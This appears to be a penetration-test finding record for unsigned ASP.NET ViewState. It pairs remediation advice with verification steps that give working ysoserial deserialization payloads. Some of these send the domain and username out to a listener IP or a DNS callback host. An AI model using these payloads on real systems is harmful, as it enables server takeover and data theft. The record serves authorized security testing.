{"default_url":null,"content":{"state":0,"taskInstructions":null,"references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":3389659,"exploitInstructions":"","verificationInstructions":"<b>Verification Instructions</b><br><br>1. Look at the ViewState tab in the response in Burp to see if MAC is enabled.  Show if not enabled.<br><br>Burp does not natively support Viewstate decoding but a Portswigger extension ViewState Editor can be added to Burp.<br> <br>2. Start a listener on a internet accessible pentest system. Alternatively, use Burp Collaborator to capture DNS and HTTP(S) requests.<br><br><code>nc -lp 80<br></code><br><br>3. Create payload for the malicious ViewState, the output should look like what is below:<br><br><code><b>.\\ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c 'powershell.exe curl &quot;</b><a href='http://23.98.221.27/$Env:USERDOMAIN/$Env:username'><b>http://pentestlistenerip/$Env:USERDOMAIN/$Env:username</b></a><b>&quot;' --minify</b><br><br>/wEy1gQAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAALsDPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6YT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjxhOlByb2Nlc3M+PGE6UHJvY2Vzcy5TdGFydEluZm8+PGE6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwuZXhlIGN1cmwgaHR0cDovLzIzLjk4LjIyMS4yNy8kRW52OlVTRVJET01BSU4vJEVudjp1c2VybmFtZSIgRmlsZU5hbWU9ImNtZCIvPjwvYTpQcm9jZXNzLlN0YXJ0SW5mbz48L2E6UHJvY2Vzcz48L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT48L09iamVjdERhdGFQcm92aWRlcj4L<br></code><br>Alternatively you can do a timeout check with the internal fork.<br> <br><code><b>.\\ysoserial.exe -g TextFormattingRunProperties -f LosFormatter --timeoutPayload -c &quot;none&quot; --minify</b><br><br>/wEy8QQAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAANYDPFJlc291cmNlRGljdGlvbmFyeSB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczphPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLlRocmVhZGluZzthc3NlbWJseT1tc2NvcmxpYiI+PE9iamVjdERhdGFQcm92aWRlciBhOktleT0ieCIgT2JqZWN0VHlwZT0ie2E6VHlwZSBjOlRocmVhZH0iIE1ldGhvZE5hbWU9IlNsZWVwIj48T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+PGI6SW50MzI+MTAwMDA8L2I6SW50MzI+PC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48L09iamVjdERhdGFQcm92aWRlcj48L1Jlc291cmNlRGljdGlvbmFyeT4L<br></code><br>or<br><br><code> <b>.\\ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c 'powershell.exe sleep 10' --minify</b>   <br></code><br><br>or for legacy (.NET &lt; 4.0) systems (current username enumeration, special characters stripped, via HTTP / DNS). Source: https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/<br><br><code>ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &quot;powershell invoke-webrequest http://$([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -replace '\\W').413u13cjytkq58msimkw44ovjmpcd1.net-spi.com&quot; --apppath=&quot;/testaspx/&quot; --islegacy --validationalg=&quot;SHA1&quot; --validationkey=&quot;70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0&quot; --isdebug<br></code><br><br>3. Create viewstate for request.<br><br><code> https://vulnerablewebapp.com/Login.aspx?__VIEWSTATE=%2f<b><red>wEy8QQAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAANYDPFJlc291cmNlRGljdGlvbmFyeSB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczphPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLlRocmVhZGluZzthc3NlbWJseT1tc2NvcmxpYiI%2bPE9iamVjdERhdGFQcm92aWRlciBhOktleT0ieCIgT2JqZWN0VHlwZT0ie2E6VHlwZSBjOlRocmVhZH0iIE1ldGhvZE5hbWU9IlNsZWVwIj48T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2bPGI6SW50MzI%2bMTAwMDA8L2I6SW50MzI%2bPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48L09iamVjdERhdGFQcm92aWRlcj48L1Jlc291cmNlRGljdGlvbmFyeT4LaW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczphPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLlRocmVhZGluZzthc3NlbWJseT1tc2NvcmxpYiI%2bPE9iamVjdERhdGFQcm92aWRlciBhOktleT0ieCIgT2JqZWN0VHlwZT0ie2E6VHlwZSBjOlRocmVhZH0iIE1ldGhvZE5hbWU9IlNsZWVwIj48T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2bPGI6SW50MzI%2bMTAwMDA8L2I6SW50MzI%2bPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48L09iamVjdERhdGFQcm92aWRlcj48L1Jlc291cmNlRGljdGlvbmFyeT4L </red></b><br></code><br>4. The command will run in the background.  It will either sleep for 10 seconds or run the provided command.<br><br><b>Reporting Requirements</b><br><ol><li>Screenshot Burp showing that MAC is not enabled and command executed.</li><br></ol><br><br>","remediationInstructions":"Ensure that ASP .NET VIEWSTATE is signed to prevent tampering.  To ensure that this occurs, set the Page.EnableViewStateMac property to true on any pages where the View State is not currently signed.<br><br>Additionally, ensure that  AspNetEnforceViewStateMac property is not set to 0 in the  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\v{VersionHere} Windows registry key.<br>","name":"ASP.NET - View State without MAC Enabled","sourceId":"M:3389659","severity":"High","businessImpact":"If the View State contains any items that are critical to the server's processing of the request, then this may result in a security exposure. The deserialization of user-controlled object streams at runtime can allow attackers to execute arbitrary code on the server, abuse application logic, and/or lead to denial of service.Â <br>","description":"The View State is a mechanism built in to the ASP.NET platform for persisting elements of the user interface and other data across successive requests. The data to be persisted is serialized by the server and transmitted via a hidden form field. When it is sent back to the server using a POST method, the View State parameter is deserialized and the data is retrieved.  By default, the serialized value is signed by the server to prevent tampering by the user; however, this behavior can be disabled by setting the Page.EnableViewStateMac property to false. If this is done, then an attacker can modify the contents of the View State and cause arbitrary data to be deserialized and processed by the server.<br>"}}}